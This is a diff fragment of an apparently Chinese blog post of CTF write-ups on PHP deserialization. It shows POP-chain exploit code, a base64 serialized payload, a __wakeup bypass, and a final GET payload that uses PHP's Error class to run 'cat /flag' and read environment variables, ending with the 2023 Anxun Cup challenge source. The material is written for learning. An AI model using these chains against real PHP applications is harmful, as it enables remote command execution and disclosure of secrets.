class="hljs-keyword">public</span> <span class="hljs-variable">$args</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$class</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable language_">$this</span>-&gt;className;<br>        <span class="hljs-variable">$funcName</span> = <span class="hljs-variable language_">$this</span>-&gt;funcName;<br>        <span class="hljs-variable">$class</span>-&gt;<span class="hljs-variable">$funcName</span>(<span class="hljs-variable language_">$this</span>-&gt;args);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$arg</span></span>) </span>&#123;<br>        <span class="hljs-variable">$func</span>(<span class="hljs-variable">$arg</span>[<span class="hljs-number">0</span>]);<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">B</span>();<br><span class="hljs-variable">$a</span>-&gt;className = <span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$a</span>-&gt;funcName = <span class="hljs-string">&quot;system&quot;</span>;<br><span class="hljs-variable">$a</span>-&gt;args = <span class="hljs-string">&quot;calc.exe&quot;</span>;<br><br><span class="hljs-variable">$test</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$payload</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-variable">$test</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$payload</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230404125943007.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230404125943007.png"></p>
 <p>执行calc.exe，说明存在漏洞。更改$a-&gt;args的值，发现flag存在于环境变量中：</p>
 <p>$a-&gt;args &#x3D; “env”;</p>
 <p>(Linux的环境变量也可以通过查看根目录下文件&#x2F;proc&#x2F;self&#x2F;environ：$a-&gt;args &#x3D; “cat &#x2F;proc&#x2F;self&#x2F;environ”)</p>
 <p>POST传入</p>
-<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">payload=fTsid<span class="hljs-name">m5</span>lIjozO<span class="hljs-symbol">nM7</span>I<span class="hljs-symbol">nNncmEiOjQ6</span>czsibWV<span class="hljs-number">0</span>c<span class="hljs-number">3</span>lzIj<span class="hljs-meta">o2</span>O<span class="hljs-symbol">nM7</span>ImVtYU<span class="hljs-number">5</span>jb<span class="hljs-symbol">nVmIjo4</span>O<span class="hljs-symbol">nN9</span>ezowOiJCIjoxOk<span class="hljs-number">87</span>ImVtYU<span class="hljs-number">5</span>zc<span class="hljs-number">2</span>FsYyI<span class="hljs-number">6</span>OTpzezozOiJBIjoxOk<span class="hljs-number">8</span>=<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">payload=fTsidm5lIjozOnM7InNncmEiOjQ6czsibWV0c3lzIjo2OnM7ImVtYU5jbnVmIjo4OnN9ezowOiJCIjoxOk87ImVtYU5zc2FsYyI6OTpzezozOiJBIjoxOk8=<br></code></pre></td></tr></table></figure>
 
 <p>本题顺便复习了下___call()以及___destruct()魔术方法的使用方法：</p>
 <h3 id="call"><a href="#call" class="headerlink" title="__call():"></a>__call():</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">__call</span>(<span class="hljs-variable">$method</span>,<span class="hljs-variable">$arg_array</span>);<span class="hljs-comment">//调用一个未定义的方法的时候调用。当调用当前对象不存在的方法时，转向__call()</span><br></code></pre></td></tr></table></figure>
@@ -436,7 +89,7 @@
 <p>编写poc：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">backdoor</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;calc.exe&quot;</span>);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">popko</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$left</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$right</span>;<br><br><span class="hljs-comment">//    public function __destruct()</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$method</span>,<span class="hljs-variable">$args</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>            <span class="hljs-title function_ invoke__">backdoor</span>();<br>    &#125;<br><br>    <span class="hljs-comment">#public function __wakeup()</span><br>    <span class="hljs-comment">#&#123;</span><br>    <span class="hljs-comment">#    $this-&gt;left = &quot;&quot;;</span><br>    <span class="hljs-comment">#    $this-&gt;right = &quot;&quot;;</span><br>    <span class="hljs-comment">#&#125;</span><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">pipimi</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;a-&gt;<span class="hljs-title function_ invoke__">a</span>();<br>    &#125;<br>&#125;<br><br><br><span class="hljs-variable">$pop</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">popko</span>();<br><span class="hljs-variable">$pop</span>-&gt;left=[<span class="hljs-number">1</span>];<br><span class="hljs-variable">$pop</span>-&gt;right=[<span class="hljs-number">2</span>];<br><span class="hljs-variable">$pip</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">pipimi</span>();<br><span class="hljs-variable">$pip</span>-&gt;a=<span class="hljs-variable">$pop</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$pip</span>);<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230406153731384.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230406153731384.png"></p>
 <p>漏洞存在，注意到popko类中的__wakeup()方法若执行会将left和right的值清空，_call()方法体的条件无法满足因此要绕过__wakeup()方法，</p>
 <p>将生成的exp进行修改：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;pipimi&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;popko&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;left&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;i:<span class="hljs-number">1</span>;&#125;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;right&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;i:<span class="hljs-number">2</span>;&#125;&#125;&#125;<br><span class="hljs-comment">//将popko的对象数2改为比2大的数</span><br>O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;pipimi&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;popko&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;left&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;i:<span class="hljs-number">1</span>;&#125;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;right&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;i:<span class="hljs-number">2</span>;&#125;&#125;&#125;<br></code></pre></td></tr></table></figure>
@@ -448,12 +101,12 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;pipimi&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;Popko&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;left&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;i:<span class="hljs-number">1</span>;&#125;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;right&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;i:<span class="hljs-number">2</span>;&#125;&#125;&#125;<br></code></pre></td></tr></table></figure>
 
 <p>GET传入c</p>
-<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230406170242128.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230406170242128.png"></p>
 <p>进入后门后查看backdoor()函数体：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">backdoor</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;a&quot;</span>];<br>    <span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;b&quot;</span>];<br>    <span class="hljs-variable">$d</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;d&quot;</span>];<br>    <span class="hljs-variable">$e</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;e&quot;</span>];<br>    <span class="hljs-variable">$f</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;f&quot;</span>];<br>    <span class="hljs-variable">$g</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;g&quot;</span>];<br>    <span class="hljs-variable">$class</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable">$a</span>(<span class="hljs-variable">$b</span>);<br>    <span class="hljs-variable">$str1</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$class</span>, <span class="hljs-variable">$d</span>, <span class="hljs-variable">$e</span>);<br>    <span class="hljs-variable">$str2</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$class</span>, <span class="hljs-variable">$f</span>, <span class="hljs-variable">$g</span>);<br>    <span class="hljs-variable">$str1</span>(<span class="hljs-variable">$str2</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
 
 <p>$a是一个类，向类$a中传入参数$b返回值赋值给$class。但是并未定义这样一个满足条件的类，这时候就要去学习php原生类的知识了。查找到原生类ERROR。</p>
-<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230406171445334.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230406171445334.png"></p>
 <p>可以看到返回值前面几个字符为</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-built_in">Error</span>: <span class="hljs-number">12345</span><span class="hljs-comment">#注意引号和字符串&quot;12345&quot;之间有个空格</span><br></code></pre></td></tr></table></figure>
 
@@ -461,39 +114,39 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;ERROR&quot;</span>;<br><span class="hljs-variable">$b</span> = <span class="hljs-string">&quot;systemls&quot;</span><br><span class="hljs-comment">#此时error返回Error: systemls，其中s位于第七个位置，&quot;system&quot;长度6，同理，l位于13，&quot;ls&quot;长度2，则</span><br><span class="hljs-variable">$d</span> = <span class="hljs-number">7</span>;<br><span class="hljs-variable">$e</span> = <span class="hljs-number">6</span>;<br><span class="hljs-variable">$f</span> = <span class="hljs-number">13</span>;<br><span class="hljs-variable">$g</span> = <span class="hljs-number">2</span>;<br></code></pre></td></tr></table></figure>
 
 <p>GET传入a、b、d、e、f、g对应的值。</p>
-<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230406172912264.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230406172912264.png"></p>
 <p>命令执行成功了。</p>
 <p>对b、d、e、f、g进行修改，发现根目录下存在flag。</p>
-<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230406173119381.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230406173119381.png"></p>
 <p>最终payload：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;pipimi&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;Popko&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;left&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;i:<span class="hljs-number">1</span>;&#125;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;right&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;i:<span class="hljs-number">2</span>;&#125;&#125;&#125;&amp;a=<span class="hljs-built_in">Error</span>&amp;b=systemcat /flag&amp;d=<span class="hljs-number">7</span>&amp;e=<span class="hljs-number">6</span>&amp;f=<span class="hljs-number">13</span>&amp;g=<span class="hljs-number">9</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230406173259433.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230406173259433.png"></p>
 <hr>
 <h2 id="2023安洵杯easy-unserialize"><a href="#2023安洵杯easy-unserialize" class="headerlink" title="2023安洵杯easy_unserialize"></a>2023安洵杯easy_unserialize</h2><p>题目源码：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Good</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$g1</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$gg2</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$ggg3</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;gg2 = <span class="hljs-variable">$ggg3</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__isset</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/a-zA-Z0-9~-=!\^\+\(\)/&quot;</span>,<span class="hljs-variable">$this</span>-&gt;gg2))<br>        &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;gg2)<br>            &#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;g1-&gt;g1=<span class="hljs-number">666</span>;<br>            &#125;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;No&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Luck</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$l1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ll2</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$md5</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$lll3</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;md5 = <span class="hljs-variable">$a</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$new</span> = <span class="hljs-variable language_">$this</span>-&gt;l1;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$new</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;ll2-&gt;<span class="hljs-title function_ invoke__">ll2</span>(<span class="hljs-string">&#x27;b2&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unset</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;md5)) == <span class="hljs-number">666</span>)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable language_">$this</span>-&gt;lll3-&gt;lll3))&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;There is noting&quot;</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">To</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$t1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$tt2</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$arg1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span>,<span class="hljs-variable">$arg2</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$this</span>-&gt;arg1)===<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$this</span>-&gt;arg1))<br>        &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;t1;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span>,<span class="hljs-variable">$arg2</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;tt2-&gt;tt2)<br>        &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;what are you doing?&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">You</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$y1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">unset</span>(<span class="hljs-variable language_">$this</span>-&gt;y1-&gt;y1);<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;May be you can get what you want here&quot;</span>;<br>        <span class="hljs-title function_ invoke__">array_walk</span>(<span class="hljs-variable">$this</span>, function (<span class="hljs-variable">$one</span>, <span class="hljs-variable">$two</span>) &#123;<br>            <span class="hljs-variable">$three</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable">$two</span>(<span class="hljs-variable">$one</span>);<br>            <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$three</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$tmp</span>)&#123;<br>                <span class="hljs-keyword">echo</span> (<span class="hljs-variable">$tmp</span>.<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<br>            &#125;<br>        &#125;);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;D0g3&#x27;</span>]))<br>&#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;D0g3&#x27;</span>]);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
 <p>注意到Flag类中有__invoke()方法，当一个Flag类对象被当作方法来调用时会自动触发__invoke()，__invoke()方法下存在一个函数array_walk()，将Flag对象中的成员作为参数传入一个回调函数中。变量值为第一个参数变量名为第二个参数,eg：</p>
-<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240104152115919.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240104152115919.png"></p>
 <p>题目代码中存在语句：，new一个对象并输出很容易想到php原生类的利用。因此将其作为poc链的终点</p>
-<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240104152231540.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240104152231540.png"></p>
 <p>那么想触发__invoke()就需要将一个Flag对象作为方法来调用，注意到Luck类的__toString()方法中存在可控方法的调用</p>
-<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240104170635067.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240104170635067.png"></p>
 <p>触发__toString()方法的条件为当Luck对象被当作字符串处理时（与字符串拼接，打印出来，以及编码，正则匹配等等操作都会自动调用），这里有两处编码，一处是To类中___call()方法中，一处是Luck类中__unset()方法下的md5()处。但是__call()方法的触发需要调用一个类中不存在的方法，需要满足两个条件，类可控，调用方法可控，代码中不存在满足条件的方法。而__unset()方法，需要在对未定义成员或者私有属性调用unset()方法时触发，注意到You类的__wakeup()方法下正好有个unset()方法。</p>
-<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240104172505250.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240104172505250.png"></p>
 <p>至此poc链形成：</p>
